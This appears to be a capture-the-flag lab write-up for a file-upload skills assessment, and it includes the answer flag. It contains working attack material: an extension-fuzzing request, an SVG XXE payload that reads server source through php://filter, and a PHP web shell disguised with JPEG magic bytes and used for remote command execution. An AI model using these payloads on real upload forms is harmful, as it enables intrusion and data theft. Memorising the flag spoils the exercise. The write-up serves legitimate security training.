# Skills Assessment - File Upload Attacks
## Questions
1. Try to exploit the upload form to read the flag found at the root directory "/". **Answer: HTB{m4573r1ng_upl04d_3xpl0174710n}**
   - Fuzz for allowed file types, use ffuf with this request and the `/usr/share/wordlists/seclists/Fuzzing/file-extensions-lower-case.txt` extension list → found SVGs are allowed:
        ```request.txt
        POST /contact/upload.php HTTP/1.1
        Host: 154.57.164.78:31763
        Content-Length: 345
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMc609LBwJqM9Caxq
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Origin: http://154.57.164.78:31763
        Referer: http://154.57.164.78:31763/contact/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundaryMc609LBwJqM9Caxq
        Content-Disposition: form-data; name="uploadFile"; filename="test.FUZZ"
        Content-Type: image/jpeg

        xxx
        ------WebKitFormBoundaryMc609LBwJqM9Caxq--

        ```
        ```sh
        $ ffuf -request request.txt -w /usr/share/wordlists/seclists/Fuzzing/file-extensions-lower-case.txt -x http://127.0.0.1:8080 -fs 0
        ```
   - Use the XXE file upload attack to read the `upload.php` source code:
        ```
        POST /contact/upload.php HTTP/1.1
        Host: 154.57.164.78:31763
        Content-Length: 345
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMc609LBwJqM9Caxq
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Origin: http://154.57.164.78:31763
        Referer: http://154.57.164.78:31763/contact/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundaryMc609LBwJqM9Caxq
        Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
        Content-Type: image/svg+xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
        <svg>&xxe;</svg>
        ------WebKitFormBoundaryMc609LBwJqM9Caxq--
        ```
        ```
        <svg>PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K</svg>

        Decode to: 
        <?php
        require_once('./common-functions.php');

        // uploaded files directory
        $target_dir = "./user_feedback_submissions/";

        // rename before storing
        $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
        $target_file = $target_dir . $fileName;

        // get content headers
        $contentType = $_FILES['uploadFile']['type'];
        $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

        // blacklist test
        if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
            echo "Extension not allowed";
            die();
        }

        // whitelist test
        if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
            echo "Only images are allowed";
            die();
        }

        // type test
        foreach (array($contentType, $MIMEtype) as $type) {
            if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
                echo "Only images are allowed";
                die();
            }
        }

        // size test
        if ($_FILES["uploadFile"]["size"] > 500000) {
            echo "File too large";
            die();
        }

        if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
            displayHTMLImage($target_file);
        } else {
            echo "File failed to upload";
        }
        ```
   - Base on this code a file named `xxx.phar.jpg` with the allowed MIME type will bypass the check (the server misconfigured configs allowed for double extension reverse exploit). Create this file with:
        ```
        $ cat test.phar
        <?php system($_GET['cmd]);?>
        # FF D8 FF E0 are the magic bytes indicating a .jpg file
        $ echo 'FF D8 FF E0' | xxd -p -r >> test.phar.jpg
        $ cat test.phar >> test.phar.jpg
        $ file test.phar.jpg 
        test.phar.jpg: JPEG image data
        ```
   - Access the file (uploaded and accessible at `/contact/user_feedback_submissions/260602_test.phar.jpg`) and achieve RCE to read the flag:
        ```
        GET /contact/user_feedback_submissions/260602_test.phar.jpg?cmd=ls+/ HTTP/1.1
        ```
        ```
        GET /contact/user_feedback_submissions/260602_test.phar.jpg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt HTTP/1.1
        ```